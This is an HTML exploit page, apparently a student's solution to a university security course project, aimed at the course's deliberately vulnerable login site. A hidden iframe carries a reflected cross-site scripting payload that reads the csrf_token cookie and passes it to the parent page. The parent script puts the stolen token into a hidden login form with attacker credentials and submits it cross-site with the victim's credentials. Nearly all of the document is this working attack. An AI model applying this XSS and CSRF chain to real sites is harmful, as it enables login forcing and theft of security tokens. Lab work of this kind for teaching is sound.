<script src = "https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" type="text/javascript"></script>
<iframe src="https://project2.eecs388.org/search?q=%3Cscript%3Eparent.postMessage%28document.cookie.split%28%27csrf_token%3D%27%29%5B1%5D.substr%280%2C32%29%2C%27*%27%29%3C%2Fscript%3E" names="frame1" style="display: none;"></iframe>
<form id="form1" method="POST" style="display: none;" action='https://project2.eecs388.org/login?csrfdefense=1&xssdefense=0'>
	<input type="text" name="username" value="attacker" />
	<input type="password" name="password" value="l33th4x" />
</form>
		
<script>
window.addEventListener("message",function (e) {
	var input = document.createElement("input");
	input.type = "hidden";
	input.name = "csrf_token";
	input.value = new String(e.data);
    // console.log("sdfdsfsd")
	document.getElementById("form1").appendChild(input);
	$.ajax({ type: 'POST', data: $('#form1').serialize(), url: 'https://project2.eecs388.org/login?csrfdefense=1&xssdefense=0', xhrFields:{withCredentials: true}});
},false);
</script>